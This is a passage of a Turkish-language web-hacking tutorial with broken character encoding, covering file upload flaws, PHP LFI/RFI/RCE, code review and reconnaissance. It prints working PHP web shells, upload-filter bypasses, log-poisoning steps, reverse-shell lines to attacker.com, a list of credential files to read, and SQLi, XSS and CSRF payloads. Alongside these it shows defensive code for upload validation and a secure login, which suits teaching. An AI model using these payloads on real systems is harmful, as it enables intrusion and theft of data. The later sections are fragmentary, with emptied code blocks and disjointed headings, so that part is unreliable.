## 4.7 File Upload Vulnerabilities
<a name="47-file-upload"></a>

### File Upload Nedir? Neden Tehlikeli?

**GerÃ§ek hayat analojisi:**
```
Apartman Senaryosu:

GÃ¼venli apartman:
KapÄ±cÄ±: "Evinize ne getirebilirsiniz?"
Sen: "Koltuk, masa, sandalye"
KapÄ±cÄ±: "Tamam, buyrun"

KontrolsÃ¼z apartman:
Sen: "Bomba getiriyorum"
KapÄ±cÄ±: "Tamam, buyrun" (Kontrol etmiyor!)
SonuÃ§: Apartman patlÄ±yor!

Web:
KullanÄ±cÄ±: profil_foto.jpg yÃ¼klÃ¼yor (Tamam)
Hacker: shell.php yÃ¼klÃ¼yor (Tehlike!)
Sunucu: Kabul ediyor (Kontrol yok!)
SonuÃ§: Sunucu hacklendi!
```

### File Upload Zafiyetleri

**1. Arbitrary File Upload â†’ RCE (Remote Code Execution)**

```php
<!-- Zafiyetli upload formu: -->
<form method="POST" enctype="multipart/form-data">
  <input type="file" name="photo">
  <button>Upload</button>
</form>

<?php
// Vulnerable kod:
$target = "uploads/" . $_FILES['photo']['name'];
move_uploaded_file($_FILES['photo']['tmp_name'], $target);
echo "Uploaded: $target";
?>

<!-- SaldÄ±rÄ±: -->
1. shell.php dosyasÄ± oluÅŸtur:
<?php system($_GET['cmd']); ?>

2. Upload et
3. TarayÄ±cÄ±dan eriÅŸ:
http://site.com/uploads/shell.php?cmd=whoami

SonuÃ§:
www-data  â† Sunucu kontrolÃ¼nde!

4. Reverse shell:
?cmd=nc -e /bin/bash attacker.com 4444
```

**Web shell Ã¶rnekleri:**

```php
<!-- Minimal shell: -->
<?php system($_GET['c']); ?>

<!-- GeliÅŸmiÅŸ shell: -->
<?php
if(isset($_GET['c'])){
    $output = shell_exec($_GET['c']);
    echo "<pre>$output</pre>";
}
?>

<!-- File browser shell: -->
<?php
if(isset($_GET['dir'])){
    $files = scandir($_GET['dir']);
    foreach($files as $file){
        echo "<a href='?dir=". $_GET['dir'] ."/$file'>$file</a><br>";
    }
}
?>
```

**2. Extension Bypass Teknikleri**

```
Sunucu kuralÄ±: "Sadece .jpg, .png uzantÄ±sÄ±na izin ver"

Bypass yÃ¶ntemleri:

1. Double extension:
shell.php.jpg  â† UzantÄ± .jpg ama PHP parse eder!

2. Null byte injection:
shell.php%00.jpg  â† %00'dan sonrasÄ± ignore edilir

3. Case manipulation:
shell.PHP  (bÃ¼yÃ¼k harf)
shell.PhP  (karÄ±ÅŸÄ±k)

4. Alternative extensions:
shell.php3
shell.php4
shell.php5
shell.phtml
shell.phar

5. htaccess upload:
.htaccess dosyasÄ±:
AddType application/x-httpd-php .jpg

Sonra profil.jpg yÃ¼kle (iÃ§inde PHP kodu var)
â†’ .jpg PHP olarak Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r!
```

**3. MIME Type Bypass**

```php
// ZayÄ±f kontrol (Client-side):
if($_FILES['file']['type'] == 'image/jpeg') {
    // Upload
}

// Bypass:
Burp Suite ile MIME type deÄŸiÅŸtir:
Content-Type: image/jpeg  â† Åunu ekle
(Ama dosya iÃ§eriÄŸi PHP shell!)

Sunucu kabul eder!
```

**4. Content-based Bypass**

```
Strateji: GeÃ§erli resim + PHP kodu

1. GerÃ§ek bir resim al (image.jpg)
2. Sonuna PHP kodu ekle:

exiftool -Comment='<?php system($_GET[c]); ?>' image.jpg

3. YÃ¼kle: image.jpg
4. EriÅŸ:
http://site.com/uploads/image.jpg?c=whoami

BazÄ± sunucular parse eder!
```

**5. Path Traversal ile Upload**

```php
// Vulnerable kod:
$filename = $_FILES['file']['name'];
$path = "uploads/" . $filename;
move_uploaded_file($_FILES['file']['tmp_name'], $path);

// SaldÄ±rÄ±:
Filename: ../../shell.php

Path olur:
uploads/../../shell.php
= shell.php (root'a yazÄ±ldÄ±!)

Veya:
Filename: ../../../../var/www/html/shell.php
â†’ Web root'a yazÄ±ldÄ±!
```

### File Upload KorumasÄ±

**1. Extension Whitelist (Beyaz Liste)**

```php
<?php
$allowed = ['jpg', 'jpeg', 'png', 'gif'];
$filename = $_FILES['file']['name'];
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

if (!in_array($ext, $allowed)) {
    die("Invalid extension!");
}

// GÃ¼venli isim oluÅŸtur (user input kullanma!):
$safe_name = md5(uniqid()) . '.' . $ext;
$path = "uploads/" . $safe_name;

move_uploaded_file($_FILES['file']['tmp_name'], $path);
?>
```

**2. Content Validation (Ä°Ã§erik DoÄŸrulama)**

```php
<?php
// MIME type kontrolÃ¼ (server-side):
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
finfo_close($finfo);

$allowed_mimes = ['image/jpeg', 'image/png'];
if (!in_array($mime, $allowed_mimes)) {
    die("Invalid file type!");
}

// Resim boyutlarÄ±nÄ± kontrol et:
$size = getimagesize($_FILES['file']['tmp_name']);
if ($size === false) {
    die("Not a valid image!");
}

// Re-encode (PHP kodunu temizler):
$img = imagecreatefromjpeg($_FILES['file']['tmp_name']);
imagejpeg($img, 'uploads/safe_' . $safe_name);
imagedestroy($img);
?>
```

**3. DosyalarÄ± Web Root DÄ±ÅŸÄ±nda Sakla**

```
KlasÃ¶r yapÄ±sÄ±:
/var/www/
  â”œâ”€â”€ public/  â† Web root
  â”‚   â””â”€â”€ index.php
  â””â”€â”€ uploads/  â† WEB ROOT DIÅINDA!
      â””â”€â”€ files/

EriÅŸim:
download.php?id=12345

<?php

$file_path = '/var/www/uploads/files/' . $file_id;

// Yetki kontrolÃ¼

    die("Unauthorized!");
}

// Content-Type set et:

?>

Fayda:
- Dosyalar doÄŸrudan eriÅŸ deÄŸil
- PHP Ã§alÄ±ÅŸtÄ±rÄ±lamaz
- Yetki kontrolÃ¼ yapÄ±lÄ±r
```

# BÃ–LÃœM 5: PHP GÃœVENLÄ°ÄÄ° - SERVER-SIDE ZAAFLAR

## 5.1 PHP Temelleri: Kod Okuma Becerisi
<a name="51-php-temelleri"></a>

### Neden PHP Ã–ÄŸrenmeliyim?

**Hacker perspektifi:**
```
Web sunucularÄ±n %70'i PHP kullanÄ±yor
â†’ PHP zafiyeti bulursan, milyonlarca siteyi hackleyebilirsin

PHP = Sunucu tarafÄ± kod
â†’ TarayÄ±cÄ±da GÃ–REMEZSIN
â†’ Ama davranÄ±ÅŸÄ±ndan ANLAYABILIRSIN
```

### PHP Temel Syntax

```php
<?php
// DeÄŸiÅŸkenler
$name = "Alice";
$age = 25;
$is_admin = true;

// String concatenation

// Arrays

// KoÅŸullar

    echo "Admin paneline hoÅŸ geldin!";
} else {
    echo "Yetkisiz eriÅŸim!";
}

// DÃ¶ngÃ¼ler

    echo $i;
}

    echo $user;
}

// Fonksiyonlar

    return "Merhaba " . $name;
}

?>
```

### Superglobal Variables (Ã‡OK Ã–NEMLÄ°!)

```php
<?php
// $_GET - URL parametreleri
// URL: page.php?id=5&name=Alice

**Hacker zihniyeti:**
```
Her superglobal = KullanÄ±cÄ± inputu

â†’ Her zaman validate et!

## 5.2 PHP Zafiyetleri: LFI, RFI, RCE
<a name="52-php-zafiyetler"></a>

### 1. LFI (Local File Inclusion)

**Ne yapar?**
```
Sunucudaki YEREL dosyalarÄ± okumaya zorlar
```

**Vulnerable kod:**

```php
<?php
$page = $_GET['page'];
include($page . ".php");
?>

<!-- Normal kullanÄ±m: -->
?page=home
â†’ include("home.php")

<!-- LFI saldÄ±rÄ±sÄ±: -->
?page=../../../../etc/passwd
â†’ include("../../../../etc/passwd.php")
   (PHP uzantÄ±sÄ± eklendi ama /etc/passwd okundu!)
```

**Null byte bypass:**

```php
<?php
include($_GET['page'] . ".php");
?>

<!-- SaldÄ±rÄ±: -->
?page=/etc/passwd%00

include("/etc/passwd%00.php")
â†’ %00 (null byte) sonrasÄ±nÄ± ignore eder
â†’ include("/etc/passwd")  â† PHP uzantÄ±sÄ± yok!
```

**Path traversal:**

```
?page=../../../../../../etc/passwd
?page=....//....//....//etc/passwd
?page=..././..././..././etc/passwd
```

**Hedef dosyalar:**

```bash
# Linux:
/etc/passwd  # KullanÄ±cÄ± listesi
/etc/shadow  # Åifreler (sadece root okuyabilir)
/var/log/apache2/access.log  # Web sunucu logu
/var/log/auth.log  # Login loglarÄ±
/proc/self/environ  # Environment variables
~/.ssh/id_rsa  # SSH private key
~/.bash_history  # Komut geÃ§miÅŸi

# Windows:
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\inetpub\logs\LogFiles\W3SVC1\u_ex[YYMMDD].log
```

**Log Poisoning (LFI â†’ RCE):**

```
1. Access log'a zararlÄ± kod enjekte et:

User-Agent: <?php system($_GET['cmd']); ?>

Log'da gÃ¶rÃ¼nÃ¼r:
192.168.1.100 - [15/Jan/2025] "GET / HTTP/1.1" <?php system($_GET['cmd']); ?>

2. LFI ile log dosyasÄ±nÄ± include et:

?page=/var/log/apache2/access.log&cmd=whoami

3. Log dosyasÄ± PHP olarak parse edilir:
â†’ system('whoami') Ã§alÄ±ÅŸÄ±r!
â†’ RCE!
```

### 2. RFI (Remote File Inclusion)

**Ne yapar?**
```
UZAK sunucudan dosya include eder
```

**Vulnerable kod:**

```php
<?php
include($_GET['page']);
?>

<!-- SaldÄ±rÄ±: -->
?page=http://attacker.com/shell.txt

<!-- attacker.com/shell.txt: -->
<?php system($_GET['cmd']); ?>

<!-- Sunucu include eder: -->
include("http://attacker.com/shell.txt")
â†’ Shell kodu Ã§alÄ±ÅŸÄ±r!
â†’ RCE!
```

**Not:**
```
RFI iÃ§in PHP ayarÄ± gerekli:
allow_url_include = On

Modern PHP'de varsayÄ±lan: Off
â†’ RFI daha nadir
```

### 3. RCE (Remote Code Execution)

**Ã‡eÅŸitleri:**

**a) Command Injection:**

```php
<?php
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
?>

<!-- Normal: -->
?ip=8.8.8.8
â†’ ping -c 4 8.8.8.8

<!-- Command injection: -->
?ip=8.8.8.8; whoami
â†’ ping -c 4 8.8.8.8; whoami
â†’ Ä°ki komut Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±!

<!-- Daha tehlikeli: -->
?ip=8.8.8.8; nc -e /bin/bash attacker.com 4444
â†’ Reverse shell!
```

**Command injection characters:**

```bash
;  # Komut ayÄ±rÄ±cÄ±
&  # Background
|  # Pipe
||  # OR
&&  # AND
`  # Backtick (komut Ã§Ä±ktÄ±sÄ±)
$()  # Command substitution
```

**b) Eval Injection:**

```php
<?php
$code = $_GET['code'];
eval($code);
?>

<!-- SaldÄ±rÄ±: -->
?code=system('whoami');
â†’ eval("system('whoami');")
â†’ RCE!
```

**c) Deserialization:**

```php
<?php
$data = unserialize($_GET['data']);
?>

<!-- ZararlÄ± serialized object: -->
O:4:"Evil":1:{s:4:"code";s:10:"system(id)";}

EÄŸer __destruct() veya __wakeup() magic method varsa:
â†’ Kod Ã§alÄ±ÅŸÄ±r!
```

## 5.3 PHP Code Review: GÃ¼venlik GÃ¶zÃ¼yle Kod Okuma
<a name="53-code-review"></a>

### Code Review Zihniyeti

**Soru zihin listesi:**

```
1. User input nereden geliyor?
   - $_GET, $_POST, $_COOKIE, $_FILES?

2. Input sanitize ediliyor mu?
   - htmlspecialchars(), filter_input()?

3. SQL injection var mÄ±?
   - Prepared statement kullanÄ±lmÄ±ÅŸ mÄ±?

4. File inclusion var mÄ±?
   - include(), require() user input alÄ±yor mu?

5. Command execution var mÄ±?
   - system(), exec(), shell_exec()?

6. Yetki kontrolÃ¼ var mÄ±?
   - $_SESSION['user_id'] kontrol ediliyor mu?
```

### Ã–rnek Code Review

```php
<?php
// login.php - ZAFÄ°YETLÄ° KOD

session_start();

$username = $_POST['username'];
$password = $_POST['password'];

// ZAFÄ°YET 1: SQL Injection
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $query);

if (mysqli_num_rows($result) > 0) {
    $user = mysqli_fetch_assoc($result);
    
    // ZAFÄ°YET 2: Session Fixation (regenerate_id yok)
    $_SESSION['user_id'] = $user['id'];
    $_SESSION['username'] = $user['username'];
    $_SESSION['is_admin'] = $user['is_admin'];
    
    // ZAFÄ°YET 3: Unvalidated redirect
    $redirect = $_GET['redirect'];
    header("Location: " . $redirect);
} else {
    echo "Login failed!";
}
?>
```

**Zafiyet analizi:**

```
1. SQL Injection:
username: admin' OR '1'='1' --
password: anything

Query olur:
SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='anything'
â†’ TÃ¼m kullanÄ±cÄ±lar dÃ¶ner!

2. Session Fixation:
SaldÄ±rgan: PHPSESSID=malicious_id set eder
Kurban login olur
Session ID deÄŸiÅŸmez
â†’ SaldÄ±rgan aynÄ± ID ile girer!

3. Open Redirect:
?redirect=http://attacker.com/phishing.html
â†’ KullanÄ±cÄ± login olduktan sonra phishing sitesine yÃ¶nlenir
```

**GÃ¼venli versiyon:**

```php
<?php
// login.php - GÃœVENLÄ° KOD

session_start();

// Input validation
$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
$password = $_POST['password'];

// Prepared statement (SQL injection korumasÄ±)
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows > 0) {
    $user = $result->fetch_assoc();
    
    // Password verify (hash kontrolÃ¼)
    if (password_verify($password, $user['password_hash'])) {
        
        // Session regeneration (Session Fixation korumasÄ±)
        session_regenerate_id(true);
        
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['username'] = $user['username'];
        $_SESSION['is_admin'] = $user['is_admin'];
        $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
        $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
        
        // Validated redirect (Open Redirect korumasÄ±)
        $redirect = $_GET['redirect'] ?? '/dashboard.php';
        $allowed_redirects = ['/dashboard.php', '/profile.php'];
        
        if (in_array($redirect, $allowed_redirects)) {
            header("Location: " . $redirect);
        } else {
            header("Location: /dashboard.php");
        }
    } else {
        echo "Invalid credentials!";
    }
} else {
    echo "Invalid credentials!";
}
?>
```

# BÃ–LÃœM 6: ZAFÄ°YET BULMA METODOLOJÄ°SÄ°

## 6.1 Reconnaissance: Bilgi Toplama
<a name="61-recon"></a>

### Reconnaissance Zihniyeti

**Felsefe:**
```
"Bilgi gÃ¼Ã§tÃ¼r"

SavaÅŸ metaforu:
SaldÄ±rÄ±ya geÃ§meden Ã¶nce
â†’ DÃ¼ÅŸmanÄ± tanÄ±malÄ±sÄ±n
â†’ ZayÄ±f noktalarÄ±nÄ± bulmalÄ±sÄ±n
â†’ HaritayÄ± Ã§Ä±karmalÄ±sÄ±n

Web hacking:
SaldÄ±rÄ±ya geÃ§meden Ã¶nce
â†’ Hedefi tanÄ±malÄ±sÄ±n
â†’ Teknolojilerini Ã¶ÄŸrenmeli
â†’ SaldÄ±rÄ± yÃ¼zeyini haritalamalÄ±sÄ±n
```

### Passive Reconnaissance (Pasif KeÅŸif)

**TanÄ±m: Hedefe dokunmadan bilgi toplama**

**1. WHOIS Sorgusu:**

```bash
whois target.com

# Ã‡Ä±ktÄ±:
Domain Name: target.com
Registrar: GoDaddy
Creation Date: 2010-01-15
Expiration Date: 2026-01-15

  ns1.target.com
  ns2.target.com

  Name: John Doe
  Email: admin@target.com
  Phone: +1-555-0100
```

**DeÄŸerli bilgiler:**
```

## 6.3 Vulnerability Analysis
<a name="63-vuln-analysis"></a>

### Manuel Zafiyet Testi

**1. SQL Injection Testi:**

```
# Tek tÄ±rnak test:
?id=5'
â†’ SQL error? â†’ Vulnerable!

# Boolean test:
?id=5 AND 1=1  â†’ Normal
?id=5 AND 1=2  â†’ BoÅŸ
â†’ Boolean-based SQLi!

# Union test:
?id=5 UNION SELECT NULL,NULL,NULL
â†’ SÃ¼tun sayÄ±sÄ±nÄ± bul

?id=5 UNION SELECT username,password,email FROM users
â†’ Veri Ã§Ä±kar!
```

**2. XSS Testi:**

```html

<!-- IMG tag: -->
<img src=x onerror=alert(1)>

<!-- SVG: -->
<svg onload=alert(1)>

<!-- URL encoding: -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Event handler: -->
" onfocus=alert(1) autofocus="
```

**3. CSRF Testi:**

```html
<!-- CSRF token var mÄ± kontrol et -->

<!-- Yoksa PoC oluÅŸtur: -->
<html>
<body onload="document.forms[0].submit()">
<form action="http://target.com/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="1000">
</form>
</body>
</html>

<!-- KurbanÄ± bu sayfaya yÃ¶nlendir -->
<!-- Transfer otomatik olur! -->
```

**4. IDOR Testi:**

```
# Normal:

# Test:
/api/user/12346  â†’ BaÅŸka kullanÄ±cÄ±nÄ±n verisi?
/api/user/1  â†’ Admin?

**2. XSS â†’ Session Hijacking:**

## 6.5 Post-Exploitation
<a name="65-post-exploitation"></a>

### Post-Exploitation Nedir?

**TanÄ±m:**
```

AmaÃ§:

- KalÄ±cÄ±lÄ±k saÄŸla (persistence)

### 1. Privilege Escalation (Linux)

```bash

# uid=33(www-data) gid=33(www-data)  â† DÃ¼ÅŸÃ¼k yetki!

```

### 2. Persistence (KalÄ±cÄ±lÄ±k)

```bash

### 3. Lateral Movement (Yan Hareket)

```bash

## 7.1 Burp Suite: Web Hacker'Ä±n Ä°sviÃ§re Ã‡akÄ±sÄ±

**Felsefe:**

### Burp Suite ModÃ¼lleri

**1. Proxy - Trafik Yakalama:**

```
Ayarlar:
1. Burp â†’ Proxy â†’ Options â†’ Interface: 127.0.0.1:8080
2. Browser â†’ Proxy ayarlarÄ± â†’ 127.0.0.1:8080

2. Browser'da bir sayfa aÃ§
3. Burp'te request gÃ¶rÃ¼nÃ¼r
4. Ä°stediÄŸin gibi deÄŸiÅŸtir

**Ä°lginÃ§ deÄŸiÅŸiklikler:**

â†’

# Hidden field deÄŸiÅŸtir:

â†’ Burp'te deÄŸer="1" yap
```

**2. Repeater - Ä°steÄŸi Tekrar GÃ¶nderme:**

```
KullanÄ±m:
1. Bir isteÄŸi Repeater'a gÃ¶nder (SaÄŸ tÄ±k â†’ Send to Repeater)
2. Ä°stediÄŸin gibi deÄŸiÅŸtir
3. "Send" bas
4. CevabÄ± gÃ¶r
5. Tekrar deÄŸiÅŸtir, tekrar gÃ¶nder...

FaydasÄ±:
- SQL injection payload'larÄ± test et
- XSS payload'larÄ± dene
- FarklÄ± user_id'ler ile IDOR test et
```

**3. Intruder - Otomatik SaldÄ±rÄ±:**

```
KullanÄ±m:
1. Ä°steÄŸi Intruder'a gÃ¶nder
2. SaldÄ±rÄ± noktalarÄ±nÄ± iÅŸaretle:
   GET /api/user/Â§12345Â§ HTTP/1.1

3. Payload type seÃ§:
   - Numbers: 1, 2, 3, ...

```

**IDOR testi Ã¶rneÄŸi:**

   - WebGoat

4. Network ayarlarÄ±:

## Reconnaissance

### Nmap

[*] Meterpreter session opened!

```

- SMB versiyonu Ã¶nemli
